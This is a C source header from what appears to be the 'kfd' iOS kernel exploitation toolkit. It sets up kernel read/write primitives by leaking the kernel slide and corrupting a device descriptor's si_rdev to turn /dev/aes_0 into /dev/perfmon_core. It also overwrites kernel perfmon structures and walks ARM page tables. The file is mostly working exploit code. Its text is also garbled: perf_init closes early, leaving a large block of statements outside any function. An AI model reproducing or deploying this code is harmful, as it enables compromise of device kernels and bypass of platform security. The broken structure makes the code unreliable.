/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef perf_h
#define perf_h

// Forward declarations for helper functions.
u64 phystokv(struct kfd* kfd, u64 pa);
u64 vtophys(struct kfd* kfd, u64 va);

void perf_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    assert((size != 0) && (size <= UINT16_MAX));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    *config = (volatile struct perfmon_config){};
    config->pc_spec.ps_events = (struct perfmon_event*)(kaddr);
    config->pc_spec.ps_event_count = (u16)(size);

    struct perfmon_spec spec_buffer = {};
    spec_buffer.ps_events = (struct perfmon_event*)(uaddr);
    spec_buffer.ps_event_count = (u16)(size);
    assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_SPECIFY, &spec_buffer));

    *config = (volatile struct perfmon_config){};
}

void perf_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    assert((size != 0) && ((size % sizeof(u64)) == 0));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    volatile struct perfmon_source* source = (volatile struct perfmon_source*)(kfd->perf.shared_page.uaddr + sizeof(*config));
    volatile struct perfmon_event* event = (volatile struct perfmon_event*)(kfd->perf.shared_page.uaddr + sizeof(*config) + sizeof(*source));

    u64 source_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config);
    u64 event_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config) + sizeof(*source);

    for (u64 i = 0; i < (size / sizeof(u64)); i++) {
        *config = (volatile struct perfmon_config){};
        *source = (volatile struct perfmon_source){};
        *event = (volatile struct perfmon_event){};

        config->pc_source = (struct perfmon_source*)(source_kaddr);
        config->pc_spec.ps_events = (struct perfmon_event*)(event_kaddr);
        config->pc_counters = (struct perfmon_counter*)(kaddr + (i * sizeof(u64)));

        source->ps_layout.pl_counter_count = 1;
        source->ps_layout.pl_fixed_offset = 1;

        struct perfmon_event event_buffer = {};
        u64 kvalue = ((volatile u64*)(uaddr))[i];
        event_buffer.pe_number = kvalue;
        assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_ADD_EVENT, &event_buffer));
    }

    *config = (volatile struct perfmon_config){};
    *source = (volatile struct perfmon_source){};
    *event = (volatile struct perfmon_event){};
}

void perf_init(struct kfd* kfd)
{
    /*
     * Allocate a page that will be used as a shared buffer between user space and kernel space.
     */
    vm_address_t shared_page_address = 0;
    vm_size_t shared_page_size = pages(1);
    assert_mach(vm_allocate(mach_task_self(), &shared_page_address, shared_page_size, VM_FLAGS_ANYWHERE));
    memset((void*)(shared_page_address), 0, shared_page_size);
    kfd->perf.shared_page.uaddr = shared_page_address;
    kfd->perf.shared_page.size = shared_page_size;

    /*
     * Open a "/dev/aes_0" descriptor, then use it to find the kernel slide.
     */
    kfd->perf.dev.fd = open("/dev/aes_0", O_RDWR);
    assert(kfd->perf.dev.fd > 0);
}

    assert(kfd->info.kernel.current_proc);
    u64 fd_ofiles_kaddr = kfd->info.kernel.current_proc + dynamic_offsetof(proc, p_fd_fd_ofiles);
    u64 fd_ofiles = 0;
    kread((u64)(kfd), fd_ofiles_kaddr, &fd_ofiles, sizeof(fd_ofiles));

    u64 fileproc_kaddr = unsign_kaddr(fd_ofiles) + (kfd->perf.dev.fd * sizeof(u64));
    u64 fileproc = 0;
    kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
    u64 fp_glob_kaddr = fileproc + offsetof(struct fileproc, fp_glob);
    u64 fp_glob = 0;
    kread((u64)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
    u64 fg_ops = kget_u64(fileglob__fg_ops, unsign_kaddr(fp_glob));
    u64 fo_kqfilter =  kget_u64(fileops__fo_kqfilter, unsign_kaddr(fg_ops));
    u64 vn_kqfilter = unsign_kaddr(fo_kqfilter);
    u64 kernel_slide = vn_kqfilter - kc->vn_kqfilter;
    u64 kernel_base = kc->kernel_base + kernel_slide;
    kfd->info.kernel.kernel_slide = kernel_slide;
    print_x64(kfd->info.kernel.kernel_slide);

    if (kfd->kread.krkw_method_ops.kread == kread_sem_open_kread) {
        u32 mh_header[2] = {};
        mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
        mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
        printf(mh_header);
//        assert(mh_header[0] == 0xfeedfacf);
//        assert(mh_header[1] == 0x0100000c);
    }

    /*
     * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
     */
    u64 fg_data = kget_u64(fileglob__fg_data, unsign_kaddr(fp_glob));
    u64 v_specinfo = kget_u64(vnode__v_un__vu_specinfo, unsign_kaddr(fg_data));
    kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + kfd_offset(specinfo__si_rdev);
    kread((u64)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));

    u64 cdevsw_kaddr = kfd_offset(kernelcache__cdevsw) + kernel_slide;
    u64 perfmon_dev_open_kaddr = kfd_offset(kernelcache__perfmon_dev_open) + kernel_slide;
    u64 cdevsw[14] = {};
    u32 dev_new_major = 0;
    for (u64 dmaj = 0; dmaj < 64; dmaj++) {
        u64 kaddr = cdevsw_kaddr + (dmaj * sizeof(cdevsw));
        kread((u64)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
        u64 d_open = unsign_kaddr(cdevsw[0]);
        if (d_open == perfmon_dev_open_kaddr) {
            dev_new_major = (dmaj << 24);
            break;
        }
    }

    u32 new_si_rdev_buffer[2] = {};
    new_si_rdev_buffer[0] = dev_new_major;
    new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
    kwrite((u64)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));

    /*
     * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
     */
    u64 ptov_table_kaddr = kc->ptov_table + kernel_slide;
    kread((u64)(kfd), ptov_table_kaddr, &kfd->info.kernel.ptov_table, sizeof(kfd->info.kernel.ptov_table));

    u64 gVirtBase_kaddr = kc->gVirtBase + kernel_slide;
    kread((u64)(kfd), gVirtBase_kaddr, &kfd->info.kernel.gVirtBase, sizeof(kfd->info.kernel.gVirtBase));
    print_x64(kfd->info.kernel.gVirtBase);

    u64 gPhysBase_kaddr = kc->gPhysBase + kernel_slide;
    kread((u64)(kfd), gPhysBase_kaddr, &kfd->info.kernel.gPhysBase, sizeof(kfd->info.kernel.gPhysBase));
    print_x64(kfd->info.kernel.gPhysBase);

    u64 gPhysSize_kaddr = kc->gPhysSize + kernel_slide;
    kread((u64)(kfd), gPhysSize_kaddr, &kfd->info.kernel.gPhysSize, sizeof(kfd->info.kernel.gPhysSize));
    print_x64(kfd->info.kernel.gPhysSize);

    assert(kfd->info.kernel.current_pmap);
    u64 ttbr0_va_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, tte);
    u64 ttbr0_pa_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, ttep);
    kread((u64)(kfd), ttbr0_va_kaddr, &kfd->info.kernel.ttbr[0].va, sizeof(kfd->info.kernel.ttbr[0].va));
    kread((u64)(kfd), ttbr0_pa_kaddr, &kfd->info.kernel.ttbr[0].pa, sizeof(kfd->info.kernel.ttbr[0].pa));
    assert(phystokv(kfd, kfd->info.kernel.ttbr[0].pa) == kfd->info.kernel.ttbr[0].va);

    assert(kfd->info.kernel.kernel_pmap);
    u64 ttbr1_va_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, tte);
    u64 ttbr1_pa_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, ttep);
    kread((u64)(kfd), ttbr1_va_kaddr, &kfd->info.kernel.ttbr[1].va, sizeof(kfd->info.kernel.ttbr[1].va));
    kread((u64)(kfd), ttbr1_pa_kaddr, &kfd->info.kernel.ttbr[1].pa, sizeof(kfd->info.kernel.ttbr[1].pa));
    assert(phystokv(kfd, kfd->info.kernel.ttbr[1].pa) == kfd->info.kernel.ttbr[1].va);

    /*
     * Find the shared page in kernel space.
     */
    kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
    kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);

    /*
     * Set up the perfmon device use for the master kread and kwrite:
     * - perfmon_devices[0][0].pmdv_config = kfd->perf.shared_page.kaddr
     * - perfmon_devices[0][0].pmdv_allocated = true
     */
    struct perfmon_device perfmon_device = {};
    u64 perfmon_device_kaddr = kfd_offset(kernelcache__perfmon_devices) + kernel_slide;
    u8* perfmon_device_uaddr = (u8*)(&perfmon_device);
    kread((u64)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));

    perfmon_device.pmdv_mutex[1] = (-1);
    perfmon_device.pmdv_config = (struct perfmon_config*)(kfd->perf.shared_page.kaddr);
    perfmon_device.pmdv_allocated = true;

    kwrite((u64)(kfd), perfmon_device_uaddr + 12, perfmon_device_kaddr + 12, sizeof(u64));
    ((volatile u32*)(perfmon_device_uaddr))[4] = 0;
    kwrite((u64)(kfd), perfmon_device_uaddr + 16, perfmon_device_kaddr + 16, sizeof(u64));
    ((volatile u32*)(perfmon_device_uaddr))[5] = 0;
    kwrite((u64)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(u64));
    kwrite((u64)(kfd), perfmon_device_uaddr + 24, perfmon_device_kaddr + 24, sizeof(u64));
    kwrite((u64)(kfd), perfmon_device_uaddr + 28, perfmon_device_kaddr + 28, sizeof(u64));

    kfd->perf.saved_kread = kfd->kread.krkw_method_ops.kread;
    kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
    kfd->kread.krkw_method_ops.kread = perf_kread;
    kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
}

void perf_free(struct kfd* kfd)
{
    kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
    kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;

    /*
     * Restore the "/dev/perfmon_core" descriptor back to the "/dev/aes_0" descriptor.
     * Then, close it and deallocate the shared page.
     * This leaves the first perfmon device "pmdv_allocated", which is fine.
     */
    kwrite((u64)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
    assert_bsd(close(kfd->perf.dev.fd));
    assert_mach(vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size));
}

/*
 * Helper perf functions.
 */

u64 phystokv(struct kfd* kfd, u64 pa)
{
    const u64 PTOV_TABLE_SIZE = 8;
    const u64 gVirtBase = kfd->info.kernel.gVirtBase;
    const u64 gPhysBase = kfd->info.kernel.gPhysBase;
    const u64 gPhysSize = kfd->info.kernel.gPhysSize;
    
    const struct ptov_table_entry* ptov_table = &kfd->info.kernel.ptov_table[0];

    for (u64 i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
        if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
            return pa - ptov_table[i].pa + ptov_table[i].va;
        }
    }

//    assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
    return pa - gPhysBase + gVirtBase;
}

u64 vtophys(struct kfd* kfd, u64 va)
{
    const u64 ROOT_LEVEL = PMAP_TT_L1_LEVEL;
    const u64 LEAF_LEVEL = PMAP_TT_L3_LEVEL;

    u64 pa = 0;
    u64 tt_kaddr = (va >> 63) ? kfd->info.kernel.ttbr[1].va : kfd->info.kernel.ttbr[0].va;

    for (u64 cur_level = ROOT_LEVEL; cur_level <= LEAF_LEVEL; cur_level++) {
        u64 offmask, shift, index_mask, valid_mask, type_mask, type_block;
        switch (cur_level) {
            case PMAP_TT_L0_LEVEL: {
                offmask = ARM_16K_TT_L0_OFFMASK;
                shift = ARM_16K_TT_L0_SHIFT;
                index_mask = ARM_16K_TT_L0_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L1_LEVEL: {
                offmask = ARM_16K_TT_L1_OFFMASK;
                shift = ARM_16K_TT_L1_SHIFT;
                index_mask = ARM_16K_TT_L1_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L2_LEVEL: {
                offmask = ARM_16K_TT_L2_OFFMASK;
                shift = ARM_16K_TT_L2_SHIFT;
                index_mask = ARM_16K_TT_L2_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L3_LEVEL: {
                offmask = ARM_16K_TT_L3_OFFMASK;
                shift = ARM_16K_TT_L3_SHIFT;
                index_mask = ARM_16K_TT_L3_INDEX_MASK;
                valid_mask = ARM_PTE_TYPE_VALID;
                type_mask = ARM_PTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_L3BLOCK;
                break;
            }
            default: {
                assert_false("bad pmap tt level");
                return 0;
            }
        }

        u64 tte_index = (va & index_mask) >> shift;
        u64 tte_kaddr = tt_kaddr + (tte_index * sizeof(u64));
        u64 tte = 0;
        kread((u64)(kfd), tte_kaddr, &tte, sizeof(tte));

        if ((tte & valid_mask) != valid_mask) {
            return 0;
        }

        if ((tte & type_mask) == type_block) {
            pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
            break;
        }

        tt_kaddr = phystokv(kfd, tte & ARM_TTE_TABLE_MASK);
    }

    return pa;
}

#endif /* perf_h */
